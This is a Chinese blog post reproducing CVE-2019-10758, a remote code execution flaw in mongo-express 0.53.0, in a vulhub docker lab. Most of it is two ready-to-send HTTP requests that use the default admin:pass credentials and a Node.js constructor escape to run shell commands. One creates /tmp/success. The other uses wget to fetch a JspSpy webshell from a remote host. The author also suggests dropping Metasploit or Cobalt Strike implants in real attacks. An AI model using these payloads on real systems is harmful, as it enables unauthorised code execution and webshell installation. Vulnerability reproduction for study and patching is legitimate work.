# CVE-2019-10758-Mongo-express-远程代码执行 - Null1433 - 博客园

> 原文：[`www.cnblogs.com/null1433/p/12740333.html`](https://www.cnblogs.com/null1433/p/12740333.html)

漏洞分析

[`xz.aliyun.com/t/7056`](https://xz.aliyun.com/t/7056)

漏洞简介

mongo-express 是一款 mongodb 的第三方 Web 界面，使用 node 和 express 开发。

如果攻击者可以成功登录，或者目标服务器没有修改默认的账号密码（`admin:pass`），则可以执行任意 node.js 代码。

影响版本

mongo-express 0.53.0

前提条件

1.知道 Mongo 的账号密码，或者未授权

特殊情况

由于 poc 中，用 docker 拉的 mongodb 默认是未授权的形式，所以不需要-u&-p 来指定数据库的账号密码。但是实际环境中 mongodb 不太可能是未授权，所以我觉得以 cli+参数启动服务的场景应该算是多见吧。

那么如果受害者指定了用户名&密码去启动 express-mongo，那么攻击者直接未授权就可以打(即不需要指定 authoriza header)

环境搭建

[`github.com/vulhub/vulhub/tree/master/mongo-express/CVE-2019-10758`](https://github.com/vulhub/vulhub/tree/master/mongo-express/CVE-2019-10758)

环境启动后，访问`http://your-ip:8081`即可查看到 Web 页面。

复现环境

mongo-express 0.53.0

MongoDB Version  3.4.24

直接构造 poc 发送即可

![](img/4c3b146300cd9fec802965dfd6d0d569.png)

 就会在 /tmp 目录下生成 success

```
POST /checkValid HTTP/1.1 Host: 目标 ip Accept-Encoding: gzip, deflate
Accept: */* Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Authorization: Basic YWRtaW46cGFzcw==
Content-Type: application/x-www-form-urlencoded
Content-Length: 124

document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("touch /tmp/success")
```

进入 docker 环境里查看 /tmp 目录

![](img/1503c5973355b69bf0eb2876d185e04f.png)

 -----------------------------------------------------------------

测试反弹 shell 不成功

![](img/5f2665499e150a3dd9fd9d4d2d042679.png)

 那么来测试远程下载

![](img/655c76643490b7292403554771311c74.png)

 远程下载实战中可以下载到绝对路径，或者下载 msf/cs 马到/tmp 目录上线

```
POST /checkValid HTTP/1.1 Host: 目标 ip Accept-Encoding: gzip, deflate
Accept: */* Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Authorization: Basic YWRtaW46cGFzcw==
Content-Type: application/x-www-form-urlencoded
Content-Length: 161

document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("wget http://目标文件/JspSpy.jsp.txt -O /tmp/5.jsp")
```

查询 /tmp 目录下是否下载 5.jsp

![](img/425f778742ce6ae07368101bf557a29d.png)